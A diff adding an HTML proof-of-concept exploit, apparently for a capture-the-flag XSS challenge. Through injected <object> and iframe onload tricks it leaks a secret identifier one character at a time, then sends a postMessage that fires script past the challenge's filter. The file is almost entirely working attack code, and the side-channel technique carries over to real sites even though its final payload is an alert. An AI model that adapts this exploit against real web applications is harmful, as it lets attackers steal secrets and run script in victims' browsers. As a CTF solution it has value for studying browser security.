@@ -1,0 +1,67 @@
+<iframe name=i_true 
+        src=//easterxss.terjanq.me/style.css
+        onload=process(this,true)
+></iframe>
+<iframe name=i_false 
+        src=//easterxss.terjanq.me/style.css
+        onload=process(this,false)
+></iframe>
+<script>
+  // add ~ to the alphabet so the poc works. without it, z would be never detected
+  const alph = '0123456789abcdefghijklmnopqrstuvwxyz~'
+
+  // store current index and current identifier in sessionStorage
+  let cur_char = parseInt(sessionStorage.getItem('current')) || 0;
+  let cur_identifier = sessionStorage.getItem('identifier') || '';
+  
+  // generate payload
+  const top_url = 'https://easterxss.terjanq.me/?error=' + encodeURIComponent(
+    `<object name=poc 
+            data=${location.href}
+            onload=/#/.source+identifier<location.hash?top.poc.i_true.location++:top.poc.i_false.location++
+    ></object>`.replace(/\s+/g,' '));
+
+  // start payload
+  if(top === window){
+      sessionStorage.setItem('current', 0);
+      sessionStorage.setItem('identifier', '');
+      location = top_url + '#0';
+  }
+
+  function process(ifr, value){
+    // Skip first onload
+    if(!ifr.loaded) {
+        ifr.loaded = true 
+        return;
+    }
+    // first less value, means the previous was matched character
+    if(value === true){
+        // If cur_char is 0, it means that the strings are equal.
+        if(cur_char === 0) return solve(cur_identifier);
+        cur_identifier += alph[cur_char-1];
+        console.log(cur_identifier)
+        // store new identifier in sessionStorage and reset cur_char
+        cur_char = 0;
+        sessionStorage.setItem('identifier', cur_identifier)
+    }else{
+        // try next character
+        cur_char += 1;
+    }
+    // update sessionStorage, change challenge's URL fragment to check next
+    // characters, and reload the window to trigger onload event again and again
+    sessionStorage.setItem('current', cur_char);
+    top.location = top_url + '#' + cur_identifier + alph[cur_char]
+    location.reload();
+  }
+
+  // with leaked identifier execute full blown XSS
+  function solve(identifier) {
+        top.postMessage({
+            type: 'waf',
+            identifier,
+            str: `<iframe onload="alert(/this_is_flag/)">`,
+            safe: true
+        }, '*')
+    }
+  
+</script>
